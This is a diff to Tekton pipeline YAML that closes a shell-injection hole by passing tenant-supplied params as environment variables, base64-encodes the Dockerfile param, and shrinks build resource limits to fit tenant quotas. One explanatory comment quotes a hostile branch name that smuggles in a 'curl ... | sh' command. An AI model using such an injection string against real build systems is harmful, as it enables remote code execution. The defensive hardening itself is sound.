@@ -21,7 +21,8 @@ spec:
       type: string
     - name: revision
       type: string
-    - name: dockerfile
+    # Base64, not the file itself. See the env block below.
+    - name: dockerfile-b64
       type: string
       default: ""
   workspaces:
@@ -41,10 +42,27 @@ spec:
         # pipeline timeout — minutes spent on a failure knowable immediately.
         - name: GIT_TERMINAL_PROMPT
           value: "0"
+        # Params reach the script as ENVIRONMENT, never as text spliced into
+        # it. Tekton substitutes $(params.x) textually, so a branch named
+        #     "; curl evil.sh | sh; "
+        # would be pasted straight into this shell and executed — and the
+        # branch is a tenant-supplied string. Read as "$REVISION" the shell
+        # treats it as data, whatever it contains.
+        - name: REPO_URL
+          value: $(params.repo-url)
+        - name: REVISION
+          value: $(params.revision)
+        # Base64 for the same reason, plus a plain one: a Dockerfile contains
+        # quotes and newlines (CMD ["true"]), and textual substitution into a
+        # quoted shell string mangles it — kaniko then fails with "arrays must
+        # be comprised of strings only", which describes neither the cause nor
+        # the file.
+        - name: DOCKERFILE_B64
+          value: $(params.dockerfile-b64)
       script: |
         #!/bin/sh
         set -eu
-        git clone --depth 1 --branch "$(params.revision)" "$(params.repo-url)" "$(workspaces.source.path)/repo"
+        git clone --depth 1 --branch "$REVISION" "$REPO_URL" "$(workspaces.source.path)/repo"
         # Drop the git metadata before anything builds from this directory: it
         # carries the remote configuration and, for an authenticated clone, is
         # where a credential would live. A tenant Dockerfile doing `COPY . .`
@@ -59,8 +77,8 @@ spec:
         # Never overwrite: a repository that ships its own Dockerfile must
         # build from that one, and the platform's guess would silently replace
         # it with something that builds a different image.
-        if [ -n "$(params.dockerfile)" ] && [ ! -f "$(workspaces.source.path)/repo/Dockerfile" ]; then
-          printf '%s' "$(params.dockerfile)" > "$(workspaces.source.path)/repo/Dockerfile"
+        if [ -n "$DOCKERFILE_B64" ] && [ ! -f "$(workspaces.source.path)/repo/Dockerfile" ]; then
+          printf '%s' "$DOCKERFILE_B64" | base64 -d > "$(workspaces.source.path)/repo/Dockerfile"
           echo "No Dockerfile in the repository — wrote the generated one."
         fi
 ---
@@ -102,13 +120,24 @@ spec:
       # `computeResources`, not `resources`: the latter is the v1beta1
       # spelling and the v1 webhook rejects the whole file with
       # "unknown field resources", naming no task.
+      # Sized to fit inside the SMALLEST tenant quota with the tenant's own
+      # app already running, not to build as fast as the node can.
+      #
+      # A namespace's quota is limits.cpu = the preset's total vCPU — 2 for
+      # `small` (renderers/namespace.py). A build asking for a 2 CPU limit
+      # therefore wants the tenant's entire quota and can never be admitted
+      # while anything of theirs is running: the TaskRun sits in
+      # ExceededResourceQuota until the pipeline times out, naming a number
+      # the tenant never chose.
+      #
+      # A slower build that runs beats a faster one that cannot start.
       computeResources:
         requests:
-          cpu: 250m
-          memory: 512Mi
+          cpu: 100m
+          memory: 256Mi
         limits:
-          cpu: "2"
-          memory: 2Gi
+          cpu: 500m
+          memory: 1Gi
 ---
 apiVersion: tekton.dev/v1
 kind: Task
